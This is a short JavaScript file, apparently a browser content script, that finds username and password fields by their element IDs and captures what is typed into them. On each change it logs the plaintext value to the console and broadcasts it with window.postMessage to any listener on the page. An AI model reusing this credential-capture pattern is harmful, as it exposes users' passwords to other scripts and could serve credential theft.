var loginDictionary = ["Login", "login", "LOGIN"] 
var usernameDictionary = ["user", "Username", "USER", "email", "User"] 
var passwordDictionary = ["password", "pass", "PASSWORD", "Password"]

//Get input elements from DOM 
var inputElementsArray = Array.from(document.getElementsByTagName("input"));



var usernameElements = searchForLoginElement(usernameDictionary);
var passwordElements = searchForLoginElement(passwordDictionary);

usernameElements.forEach(element => element.addEventListener("change", updateUsernameValue));
passwordElements.forEach(element => element.addEventListener("change", updatePasswordValue));


//Function to look for login ref on url
//Parameter URL
function searchForLogin(url){   
    try {
      return loginDictionary.some(x => url.includes(x))      
    } catch (error) {
      console.log("ERROR", error)
    }
}

//Get usernameElements
function searchForLoginElement(dictionary){ 
  try {
    return inputElementsArray.filter(x => find(x, dictionary))    
  } catch (error) {
    console.log("ERROR", error)
  }
}

function find(element, dictionary){
    if(element.id != null && dictionary.some(x => element.id.includes(x))){
     return element;
    }
 }
 
 function updateUsernameValue(e){
    var usernameValue = e.target.value;
    warnContextScript(usernameValue, "username")
    return console.log(e.target.value);
 }


 function updatePasswordValue(e){
    var passwordValue = e.target.value;
    warnContextScript(passwordValue, "password")
    return console.log(e.target.value);
 }
 
 function getValueTarget(element){
   return document.getElementById(element.id).value
 }



 function warnContextScript(value, context){
  window.postMessage({
        "input": value,
        "context": context
  });

 }